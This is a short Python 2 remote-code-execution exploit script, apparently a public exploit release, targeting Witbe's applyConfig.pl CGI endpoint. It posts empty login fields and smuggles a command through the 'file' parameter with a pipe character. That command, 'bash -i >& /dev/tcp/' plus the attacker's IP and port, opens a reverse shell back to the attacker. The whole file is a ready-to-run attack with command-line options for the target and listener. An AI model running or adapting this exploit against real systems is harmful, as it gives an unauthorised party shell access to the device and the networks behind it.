#!/usr/bin/python2
# Exploit Title: Witbe RCE (Remote Code Execution)
# Exploit Author: BeLmar
# Date: 05/10/2016
# DEMO : https://youtu.be/ooUFXfUfIs0
# Contact : hb.mz093@gmail.com
# Vendor Homepage: http://www.witbe.net
# Tested on: Windows7/10 & BackBox
# Category: Remote Exploits

import urllib
import urllib2
import os
import sys
import argparse

def main():
    parser = argparse.ArgumentParser(prog='witbe.py', description='pwn witbe')
    parser.add_argument('-t', dest='RHOST', required=True, help='Remote Target Server')
    parser.add_argument('-l', dest='LHOST', help='specifiy local ip for reverse shell')
    parser.add_argument('-p', dest='LPORT', help='specifiy local port for reverse shell')
    #parser.add_argument('--cmd', dest='cmd', action='store_true', help='drop into blind RCE')
    args = parser.parse_args()
    rhost = args.RHOST
    lhost = args.LHOST
    lport = args.LPORT


    url = 'http://'+rhost+'/cgi-bin/applyConfig.pl'
    user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36'
    values = {'auth_login': '', #Leave it as it is
              'auth_pwd': '',   #Leave it as it is
              'file': 'set|bash -i >& /dev/tcp/'+lhost+'/'+lport+' 0>&1' }

    try:
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req)
        the_page = response.read()
    except Exception as e:
        print e

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[*] Exiting...")
